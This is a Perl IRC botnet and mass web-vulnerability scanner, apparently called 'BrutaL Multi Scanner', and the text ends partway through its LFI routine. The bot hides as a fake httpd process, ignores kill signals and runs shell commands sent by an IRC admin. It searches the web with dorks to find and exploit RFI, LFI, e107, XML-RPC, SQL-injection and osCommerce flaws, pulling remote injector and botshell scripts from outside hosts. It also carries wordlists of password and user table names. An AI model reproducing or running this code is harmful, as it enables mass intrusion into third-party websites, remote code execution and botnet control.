#!/usr/bin/perl
################################################  
use HTTP::Request;                             #
use HTTP::Request::Common;                     #
use HTTP::Request::Common qw(POST);            #
use LWP::Simple;                               #
use LWP 5.64;                                  #
use LWP::UserAgent;                            #
use Socket;                                    #
use IO::Socket;                                #
use IO::Socket::INET;                          #
use IO::Select;                                #
use MIME::Base64;			       #
################################################

my $datetime = localtime;

my $fakeproc  	= "/usr/sbin/httpd"; 
my $ircserver   = "indoforum.us.allnetwork.org";
my $ircport   	= "6667";
my $nickname  	= "playboy[".int(rand(100))."]";
my $ident     	= "Unand";
my $channel   	= "#Unand";
my $admin    	= "khensy";
my $fullname  	= "CafeCrew";

my $nob0dy    = "4(8@9nob0dy4)";
my $lfilogo   = "4(8@9LFI4)";
my $rfilogo   = "4(8@9RFI4)";
my $e107logo  = "4(8@9e1074)";
my $xmllogo   = "4(8@9XML4)";
my $sqllogo   = "4(8@9SQL4)";
my $oscologo   = "4(8@9OSCO4)";

my $lficmd    = '!lfi';
my $rficmd    = '!rfi';
my $e107cmd   = '!e107';
my $xmlcmd	  = '!xml';
my $sqlcmd	  = '!sql';
my $oscocmd	  = '!osco';
my $cmdlfi    = '!cmdlfi';
my $cmde107   = '!cmde107';
my $cmdxml	  = '!cmdxml';

my $injector  = "http://technorabits.com/Arta/xml";
my $botshell  = "http://www.geocities.ws/sumatera/bot/log.txt";
my $botak	  = "http://www.lsp-to.or.id/network/tools/ntah.jpg";

my @uagents   = ('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; pl-PL; rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4',
'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6',
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1');
my $uagent    = $uagents[rand(scalar(@uagents))];
my $lfdtest   = "../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000";

my @tabele		= ('admin','tblUsers','tblAdmin','user','users','username','usernames','usuario',
					'name','names','nombre','nombres','usuarios','member','members','admin_table','miembro','miembros','membername','admins','administrator',
					'administrators','passwd','password','passwords','pass','Pass','tAdmin','tadmin','user_password','user_passwords','user_name','user_names',
					'member_password','mods','mod','moderators','moderator','user_email','user_emails','user_mail','user_mails','mail','emails','email','address',
					'e-mail','emailaddress','correo','correos','phpbb_users','log','logins','login','registers','register','usr','usrs','ps','pw','un','u_name','u_pass',
					'tpassword','tPassword','u_password','nick','nicks','manager','managers','administrador','tUser','tUsers','administradores','clave','login_id','pwd','pas','sistema_id',
					'sistema_usuario','sistema_password','contrasena','auth','key','senha','tb_admin','tb_administrator','tb_login','tb_logon','tb_members_tb_member',
					'tb_users','tb_user','tb_sys','sys','fazerlogon','logon','fazer','authorization','membros','utilizadores','staff','nuke_authors','accounts','account','accnts',
					'associated','accnt','customers','customer','membres','administrateur','utilisateur','tuser','tusers','utilisateurs','password','amministratore','god','God','authors',
					'asociado','asociados','autores','membername','autor','autores','Users','Admin','Members','Miembros','Usuario','Usuarios','ADMIN','USERS','USER','MEMBER','MEMBERS','USUARIO','USUARIOS','MIEMBROS','MIEMBRO');
my @kolumny		= ('admin_name','cla_adm','usu_adm','fazer','logon','fazerlogon','authorization','membros','utilizadores','sysadmin','email',
					'user_name','username','name','user','user_name','user_username','uname','user_uname','usern','user_usern','un','user_un','mail',
					'usrnm','user_usrnm','usr','usernm','user_usernm','nm','user_nm','login','u_name','nombre','login_id','usr','sistema_id','author',
					'sistema_usuario','auth','key','membername','nme','unme','psw','password','user_password','autores','pass_hash','hash','pass','correo',
					'userpass','user_pass','upw','pword','user_pword','passwd','user_passwd','passw','user_passw','pwrd','user_pwrd','pwd','authors',
					'user_pwd','u_pass','clave','usuario','contrasena','pas','sistema_password','autor','upassword','web_password','web_username');
$SIG{'INT'}   = 'IGNORE';
$SIG{'HUP'}   = 'IGNORE';
$SIG{'TERM'}  = 'IGNORE';
$SIG{'CHLD'}  = 'IGNORE';
$SIG{'PS'}    = 'IGNORE';
chdir("/tmp");
$ircserver = "$ARGV[0]" if $ARGV[0];
$0 = "$fakeproc"."\0" x 16;
my $pid = fork;
exit if $pid;
die "\n[!] Something Wrong !!!: $!\n\n" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();
sub sendraw {
    if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
        print $IRC_cur_socket "$_[0]\n";
    }
}
my @domen = ("site:.org","site:.info","site:.net","site:.com","site:.edu","site:.at","site:.it","site:.am","site:.ar","site:.au","site:.az","site:.be","site:.br","site:.ca","site:.ch","site:.de","site:.dk","site:.ee","site:.es","site:.eu","site:.fr","site:.gr","site:.gu","site:.hk","site:.ht","site:.hu","site:.id","site:.il","site:.ir","site:.is","site:.rs","site:.jp","site:.kh","site:.ki","site:.kr","site:.la","site:.li","site:.ls","site:.me","site:.mk","site:.mo","site:.mn","site:.mt","site:.na","site:.nc","site:.ni","site:.nl","site:.no","site:.nr","site:.nu","site:.om","site:.pa","site:.ph","site:.pl","site:.pn","site:.pr","site:.ps","site:.pt","site:.py","site:.qa","site:.re","site:.ro","site:.ho","site:.ru","site:.sa","site:.se","site:.sh","site:.si","site:.sk","site:.sl","site:.so","site:.sr","site:.st","site:.su","site:.th","site:.tk","site:.tr","site:.bg","site:.tv","site:.ua","site:.uk","site:.co","site:.mx");
sub connector {
    my $mynick = $_[0];
    my $ircserver_con = $_[1];
    my $ircport_con = $_[2];
    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
    if (defined($IRC_socket)) {
        $IRC_cur_socket = $IRC_socket;
        $IRC_socket->autoflush(1);
        $sel_client->add($IRC_socket);
		$irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
        nick("$mynick");
        my $versi   = "4,1SIX8NER9GY.4I8n9c";
        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$versi");
        sleep (1);}}
sub parse {
    my $servarg = shift;
    if ($servarg =~ /^PING \:(.*)/) {
        sendraw("PONG :$1");
    }
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
        if (lc($1) eq lc($mynick)) {
            $mynick = $4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        }
    }
    elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
        nick("$mynick".int rand(1));
    }
    elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
        $mynick = $2;
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
        sendraw("MODE $mynick +Bxp");
        sendraw("JOIN $channel");
        sleep(2);
        sendraw("PRIVMSG $admin :Hi $admin im here !!!");
    }
}
my $line_temp;
while( 1 ) {
    while (!(keys(%irc_servers))) { &connector("$nickname", "$ircserver", "$ircport"); }
    select(undef, undef, undef, 0.01);
    delete($irc_servers{''}) if (defined($irc_servers{''}));
    my @ready = $sel_client->can_read(0);
    next unless(@ready);
    foreach $fh (@ready) {
        $IRC_cur_socket = $fh;
        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread = sysread($fh, $ircmsg, 4096);
        if ($nread == 0) {
            $sel_client->remove($fh);
            $fh->close;
            delete($irc_servers{$fh});
        }
        @lines = split (/\n/, $ircmsg);
        $ircmsg =~ s/\r\n$//;

        if ($ircmsg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
            my ($nick,$ident,$host,$path,$msg) = ($1,$2,$3,$4,$5);
			my $engine ="GooGLe,ReDiff,Bing,ALtaViSTa,AsK,UoL,CluSty,GutSer,GooGle2,ExaLead,VirgiLio,WebDe,AoL,SaPo,DuCk,YauSe,BaiDu,KiPoT,GiBLa,YahOo,HotBot,LyCos,LyGo,BLacK,oNeT,SiZuka,WaLLa,DeMos,RoSe,SeZnaM,TisCali,NaVeR";
            if ($path eq $mynick) {
                if ($msg =~ /^PING (.*)/) {
                    sendraw("NOTICE $nick :PING $1");
                }
                if ($msg =~ /^VERSION/) {
                    sendraw("NOTICE $nick :VERSION mIRC v6.17 Khaled Mardam-Bey");
                }
                if ($msg =~ /^TIME/) {
                    sendraw("NOTICE $nick :TIME ".$datetime."");
                }
                if (&isAdmin($nick) && $msg eq "!die") {
                    &shell("$path","kill -9 $$");
                }
                if (&isAdmin($nick) && $msg eq "!killall") {
                    &shell("$path","killall -9 perl");
                }
                if (&isAdmin($nick) && $msg eq "!reset") {
                    sendraw("QUIT :Restarting...");
                }
                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
                    sendraw("JOIN #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
                    sendraw("PART #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^!nick (.+)/) {
                    sendraw("NICK ".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^!pid/) {
                    sendraw($IRC_cur_socket, "PRIVMSG $nick :0,1Fake Process/PID : $fakeproc - $$");
                }
                if (&isAdmin($nick) && $msg !~ /^!/) {
                    &shell("$nick","$msg");
                }
 				if (&isAdmin($nick) && $msg=~ /^$cmdlfi\s+(.*?)\s+(.*)/){
					my $url = $1.$lfdtest;
					my $cmd = $2;
					&cmdlfi($url,$cmd,$nick);
				}
				if (&isAdmin($nick) && $msg=~ /^$cmdxml\s+(.*?)\s+(.*)/){
					my $url = $1;
					my $cmd = $2;
					&cmdxml($url,$cmd,$nick);
				}
				if (&isAdmin($nick) && $msg=~ /^$cmde107\s+(.*?)\s+(.*)/){
					my $url = $1;
					my $cmd = $2;
					&cmde107($url,$cmd,$nick);
				}
           }
            else {
                if (&isAdmin($nick) && $msg eq "!die") {
                    &shell("$path","kill -9 $$");
                }
                if (&isAdmin($nick) && $msg eq "!killall") {
                    &shell("$path","killall -9 perl");
                }
                if (&isAdmin($nick) && $msg eq "!reset") {
                    sendraw("QUIT :Restarting...");
                }
                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
                    sendraw("JOIN #".$1);
                }
                if (&isAdmin($nick) && $msg eq "!part") {
                    sendraw("PART $path");
                }
                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
                    sendraw("PART #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^\.sh (.*)/) {
                    &shell("$path","$1");
                }
                if (&isAdmin($nick) && $msg =~ /^$mynick (.*)/) {
                    &shell("$path","$1");
                }
				##################################################################### HIT

				if ($msg=~ /^$cmdlfi\s+(.+?)\s+(.*)/){
					my $url = $1.$lfdtest;
					my $cmd = $2;
					&cmdlfi($url,$cmd,$path);
				}
				if ($msg=~ /^$cmdxml\s+(.+?)\s+(.*)/){
					my $url = $1;
					my $cmd = $2;
					&cmdxml($url,$cmd,$path);
				}
				if ($msg=~ /^$cmde107\s+(.+?)\s+(.*)/){
					my $url = $1;
					my $cmd = $2;
					&cmde107($url,$cmd,$path);
				}
				if ($msg=~ /^.sms\s+(.*?)\s+(.*)/){
		
					my $no    = $1;    
					my $pesan = $2;
					if(sendSMS($no,$pesan)){
						&msg("$path","9,1 Sukses mengirim ke 4 ".$no."9 Pengirim : 4 ".$nick);
					}
					else {
						&msg("$path"," :gagal");
					}
				}	
								
                ##################################################################### HELP COMMAND

                if ($msg=~ /^!help/) {
                    my $helplogo = "4(8@9Help4)";
                    &msg("$path","4$helplogo 8 ###################################################");
                    &msg("$path","4$helplogo 8 #9( $rficmd  / $lficmd / $sqlcmd / $xmlcmd   ) [bug]    [dork] 9#");
                    &msg("$path","4$helplogo 8 #9( $cmde107 / $cmdlfi / $cmdxml ) [target] [cmd]  9#");
                    &msg("$path","4$helplogo 8 #9  $e107cmd / $oscocmd [dork]            .sms [no]     [pesan]9#");
                    &msg("$path","4$helplogo 8 ###################################################");
                }
                if ($msg=~ /^!engine/) {
                    my $enginelogo = "4(8@9Engine4)";
                    &msg("$path","4$enginelogo 8 GooGLe,ReDiff,Bing,ALtaViSTa,AsK,UoL,CluSty,GutSer,GooGle2,ExaLead,VirgiLio");
                    &msg("$path","4$enginelogo 8 WebDe,AoL,SaPo,DuCk,YauSe,BaiDu,KiPoT,GiBLa,YahOo,HotBot,LyCos,LyGo");
                    &msg("$path","4$enginelogo 8 BLacK,oNeT,SiZuka,WaLLa,DeMos,RoSe,SeZnaM,TisCali,NaVeR");
                }
                if ($msg=~ /^!about/) {
                    my $aboutlogo = "15(4@4About Bot15)";
                    &msg("$path","4$aboutlogo 8 BrutaL Multi Scanner COded By aanK FM Edited By HZ");
                }
                if ($msg=~ /^!respon/ || $msg=~ /^!id/) {
                    if (&isFound($injector,"pVd5c9pIFv97XeXv0NFm")) {
                        &notice("$nick","0,1(8Injector151)6 Ready Bro 9Go . . Go . . Go . .!!!");
                    } else {
                        &notice("$nick","0,1(8Injector151)6 Fuck You 4 Check Your Id Bastard !!!");
                    }
                }
                if (&isAdmin($nick) && $msg =~ /^!pid/) {
                    &notice("$nick","0,1Fake Process/PID : 8$fakeproc - $$");
                }
                ##################################################################### RFI SCAN

                if ($msg=~ /^$rficmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ($1,$2);
                            &msg("$path","0,1$rfilogo 12Dork :4 $dork");
                            &msg("$path","0,1$rfilogo 12Bugz :4 $bug");
                            &msg("$path","0,1$rfilogo 6Search Engine Loading ...");
                            &scan_start($path,$bug,$dork,$engine,1);
                        }
                        exit;
                    }
                }
				##################################################################### DOMRFI
				if (&isAdmin($nick) && $msg=~ /^!domrfi\s+(.*?)\s+(.*)/ ) {
					if (my $pid = fork) {
						waitpid($pid, 0);
					}
					else {
						foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];
						if (fork) {    exit; } else {
                            if (&isFound($injector,"pVd5c9pIFv97XeXv0NFm")) {
                                my ($bug,$dork) = ($1,$2." ".$domens);
                                &msg("$path","0,1$rfilogo 12Dork :4 $dork");
                                &msg("$path","0,1$rfilogo 12Bugz :4 $bug");
                                &msg("$path","0,1$rfilogo 6Search Engine Loading ...");
                                &scan_start($path,$bug,$dork,$engine,1);
                            } else {
                                &msg("$path","[ $nick ] $lfilogo 4PHP Shell Not Found!");
                            }exit;
						}
				    }
                    }
				}

                ##################################################################### LFIRCE SCAN

                if ($msg=~ /^$lficmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"pVd5c9pIFv97XeXv0NFm")) {
                                my ($bug,$dork) = ($1,$2);
                                &msg("$path","0,1$lfilogo 12Dork :4 $dork");
                                &msg("$path","0,1$lfilogo 12Bugz :4 $bug");
                                &msg("$path","0,1$lfilogo 6Loading ... Please Wait");
                                &scan_start($path,$bug,$dork,$engine,2);
                            } else {
                                &msg("$path","[ $nick ] $lfilogo 4Check Your ID Bastard!!");
                            }
                        }
                        exit;
                    }
                }
				##################################################################### DOMLFI
				if (&isAdmin($nick) && $msg=~ /^!domlfi\s+(.*?)\s+(.*)/ ) {
					if (my $pid = fork) {
						waitpid($pid, 0);
					}
					else {
						foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];
						if (fork) {    exit; } else {
                            if (&isFound($injector,"pVd5c9pIFv97XeXv0NFm")) {
                                my ($bug,$dork) = ($1,$2." ".$domens);
                                &msg("$path","0,1$lfilogo 12Dork :4 $dork");
                                &msg("$path","0,1$lfilogo 12Bugz :4 $bug");
                                &msg("$path","0,1$lfilogo 6Search Engine Loading ...");
                                &scan_start($path,$bug,$dork,$engine,2);
                            } else {
                                &msg("$path","[ $nick ] $lfilogo 4PHP Shell Not Found!");
                            }exit;
						}
				    }
                    }
				}
                ##################################################################### e107 contact.php SCAN

                if ($msg=~ /^$e107cmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"pVd5c9pIFv97XeXv0NFm")) {
                                my ($bug,$dork) = ("contact.php",$1);
                                &msg("$path","0,1$e107logo 12Dork :4 $dork");
                                &msg("$path","0,1$e107logo 12Bugz :4 $bug");
                                &msg("$path","0,1$e107logo 6Search Engine Loading ...");
                                &scan_start($path,$bug,$dork,$engine,3);
                            } else {
                                &msg("$path","[ $nick ] $e107logo 4PHP Shell Not Found!");
                            }
                        }
                        exit;
                    }
                }
				##################################################################### DOME107
				if (&isAdmin($nick) && $msg=~ /^!dome107\s+(.*)/ ) {
					if (my $pid = fork) {
						waitpid($pid, 0);
					}
					else {
						foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];
						if (fork) {    exit; } else {
                            if (&isFound($injector,"pVd5c9pIFv97XeXv0NFm")) {
                                my ($bug,$dork) = ("contact.php",$1." ".$domens);
                                &msg("$path","0,1$e107logo 12Dork :4 $dork");
                                &msg("$path","0,1$e107logo 12Bugz :4 $bug");
                                &msg("$path","0,1$e107logo 6Search Engine Loading ...");
                                &scan_start($path,$bug,$dork,$engine,3);
                            } else {
                                &msg("$path","[ $nick ] $lfilogo 4PHP Shell Not Found!");
                            }exit;
						}
				    }
                    }
				}
				##################################################################### XML SCAN
				if ($msg=~ /^$xmlcmd\s+(.*?)\s+(.*)/ ) {
					if (my $pid = fork) {
						waitpid($pid, 0);
					}
					else {
						if (fork) {    exit; } else {
                            if (&isFound($injector,"pVd5c9pIFv97XeXv0NFm")) {
                                my ($bug,$dork) = ($1,$2);
                                &msg("$path","0,1$xmllogo 12Dork :4 $dork");
                                &msg("$path","0,1$xmllogo 12Bugz :4 $bug");
                                &msg("$path","0,1$xmllogo 6Search Engine Loading ...");
                                &scan_start($path,$bug,$dork,$engine,4);
                            } else {
                                &msg("$path","[ $nick ] $xmllogo 4PHP Shell Not Found!");
                            }
                        }
                        exit;
                    }
                }
				##################################################################### DOMXML
				if (&isAdmin($nick) && $msg=~ /^!domxml\s+(.*?)\s+(.*)/ ) {
					if (my $pid = fork) {
						waitpid($pid, 0);
					}
					else {
						foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];
						if (fork) {    exit; } else {
                            if (&isFound($injector,"pVd5c9pIFv97XeXv0NFm")) {
                                my ($bug,$dork) = ($1,$2." ".$domens);
                                &msg("$path","0,1$xmllogo 12Dork :4 $dork");
                                &msg("$path","0,1$xmllogo 12Bugz :4 $bug");
                                &msg("$path","0,1$xmllogo 6Search Engine Loading ...");
                                &scan_start($path,$bug,$dork,$engine,4);
                            } else {
                                &msg("$path","[ $nick ] $lfilogo 4PHP Shell Not Found!");
                            }exit;
						}
				    }
                    }
				}
                ##################################################################### SQL SCAN

                if ($msg=~ /^$sqlcmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ($1,$2);
                            &msg("$path","0,1$sqllogo 12Dork :4 $dork");
                            &msg("$path","0,1$sqllogo 12Bugz :4 $bug");
                            &msg("$path","0,1$sqllogo 6Search Engine Loading ...");
                            &scan_start($path,$bug,$dork,$engine,5);
                        }
                        exit;
                    }
                }

                ##################################################################### OSCO SCAN

                if ($msg=~ /^$oscocmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ("admin/categories.php/login.php?cPath=&action=new_product_preview",$1);
                            &msg("$path","0,1$oscologo 12Bugz :4 $bug");
                            &msg("$path","0,1$oscologo 6Search Engine Loading ...");
                            &scan_start($path,$bug,$dork,$engine,6);
                        }
                        exit;
                    }
                }
                ##################################################################### OSCO SCAN

                if ($msg=~ /^$oscocmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ("admin/file_manager.php/login.php",$1);
                            &scan_start($path,$bug,$dork,$engine,7);
                        }
                        exit;
                    }
                }
                #####################################################################

            }
        }

        for(my $c=0; $c<= $#lines; $c++) {
            $line = $lines[$c];
            $line = $line_temp.$line if ($line_temp);
            $line_temp = '';
            $line =~ s/\r$//;
            unless ($c == $#lines) {
                &parse("$line");
            } else {
                if ($#lines == 0) {
                    &parse("$line");
                } elsif ($lines[$c] =~ /\r$/) {
                    &parse("$line");
                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
                    &parse("$line");
                } else {
                    $line_temp = $line;
                }
            }
        }
    }
}

#########################################
sub type () {
my ($chan,$bug,$dork,$engine,$type) = @_;
	if ($type == 1){$type=&rfi($chan,$bug,$dork,$engine);}
	elsif ($type == 2){$type=&lfi($chan,$bug,$dork,$engine);}
	elsif ($type == 3){$type=&e107($chan,$bug,$dork,$engine);}
	elsif ($type == 4){$type=&xml($chan,$bug,$dork,$engine);}
	elsif ($type == 5){$type=&sql($chan,$bug,$dork,$engine);}
	elsif ($type == 6){$type=&osco($chan,$bug,$dork,$engine);}
	elsif ($type == 7){$type=&osco2($chan,$bug,$dork,$engine);}
}
sub scan_start() {
my ($chan,$bug,$dork,$engine,$type) = @_;
    if ($engine =~ /google/i) {
        if (my $pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"GooGLe",$type);
        } exit; }
    }
	
    if ($engine =~ /google2/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"GooGle2",$type);
        } exit; }
    }
	
    if ($engine =~ /bing/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"Bing",$type);
        } exit; }
    }
	
    if ($engine =~ /altavista/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"ALtaViSTa",$type);
        } exit; }
    }
	
    if ($engine =~ /ask/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"AsK",$type);
        } exit; }
    }
    if ($engine =~ /uol/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"UoL",$type);
        } exit; }
    }

    if ($engine =~ /yahoo/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"YahOo",$type);
        } exit; }
    }
	
    if ($engine =~ /clusty/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"CluSty",$type);
        } exit; }
    }
	
    if ($engine =~ /gutser/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
            &type($chan,$bug,$dork,"GutSer",$type);
        } exit; }
    }
	
    if ($engine =~ /rediff/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"ReDiff",$type);
        } exit; }
    }
    if ($engine =~ /virgilio/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"VirgiLio",$type);
        } exit; }
    }

    if ($engine =~ /webde/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"WebDe",$type);
        } exit; }
    }

    if ($engine =~ /exalead/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"ExaLead",$type);
        } exit; }
    }
	
    if ($engine =~ /lycos/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"LyCos",$type);
        } exit; }
    }

    if ($engine =~ /hotbot/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"HotBot",$type);
        } exit; }
    }
    if ($engine =~ /aol/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"AoL",$type);
        } exit; }
    }
	
    if ($engine =~ /sapo/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"SaPo",$type);
        } exit; }
    }
	
    if ($engine =~ /duck/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"DuCk",$type);
        } exit; }
    }

    if ($engine =~ /lygo/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"LyGo",$type);
        } exit; }
    }

    if ($engine =~ /yause/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"YauSe",$type);
        } exit; }
    }
    if ($engine =~ /baidu/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"BaiDu",$type);
        } exit; }
    }

    if ($engine =~ /kipot/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"KiPoT",$type);
        } exit; }
    }

    if ($engine =~ /gibla/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"GiBLa",$type);
        } exit; }
    }

    if ($engine =~ /black/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"BLacK",$type);
        } exit; }
    }

	if ($engine =~ /onet/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"oNeT",$type);
        } exit; }
    }

	if ($engine =~ /sizuka/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"SiZuka",$type);
        } exit; }
    }

	if ($engine =~ /walla/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"WaLLa",$type);
        } exit; }
    }

	if ($engine =~ /demos/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"DeMos",$type);
        } exit; }
    }

	if ($engine =~ /rose/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"RoSe",$type);
        } exit; }
    }

	if ($engine =~ /seznam/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"SeZnaM",$type);
        } exit; }
    }

	if ($engine =~ /tiscali/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"TisCali",$type);
        } exit; }
    }

	if ($engine =~ /naver/i) {
        if ($pid = fork) { waitpid($pid, 0); }
        else { if (fork) { exit; } else {
		&type($chan,$bug,$dork,"NaVeR",$type);
        } exit; }
    }	
}

#########################################

sub rfi() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$rfilogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
				if ($count == $num-1) { &msg("$chan","0,1$rfilogo(@8$engine15)10 Scan finish"); }
				my $coba = "http://".$site.$bug."test??";
				my $test = "http://".$site.$bug.$injector."??";
				my $dor  = "http://".$site.$bug.$botshell."??";
				my $vuln = "http://".$site."12".$bug."14remote file??";
				my $cek  = &get_content($coba);sleep(1);
				&get_content($dor);sleep(1);
				if ($cek =~ /failed to open stream/) { my $check = &get_content($test);sleep(2);
				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
				if ($check =~ /STUN/) {
				my $os = ""; my $free = ""; my $uid = "";
				if ($check =~ m/color=red><b>&nbsp;&nbsp;&nbsp;(.*?)<br>/) {$os = $1;}
				if ($check =~ m/Total space: <b>(.*?)<\/b><br>/) {$free = $1;}
				if ($check =~ m/uid=(.*?)gid=/) {$uid = $1;}
				&msg("$chan","0,1$rfilogo(4@8$engine15)15(13@12VuLn15)10 ".$vuln."3 (OS=$os) (total=$free) (uid=$uid (4@12safemode-off15)");sleep(2);
				}
				else {&msg("$chan","0,1$rfilogo(4@8$engine15)15(13@12VuLn15)10 ".$vuln." (4@4safemode-on15)");sleep(2);}
				} exit;}}
		}
	}
}

sub lfi() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$lfilogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","0,1$lfilogo(4@8$engine15)10 Scan finish"); }
            my $dir = "../../../../../../../../../../../../../../../../../../../../../../../../";
            my $test = "http://".$site.$bug.$dir."/proc/self/environ%0000";
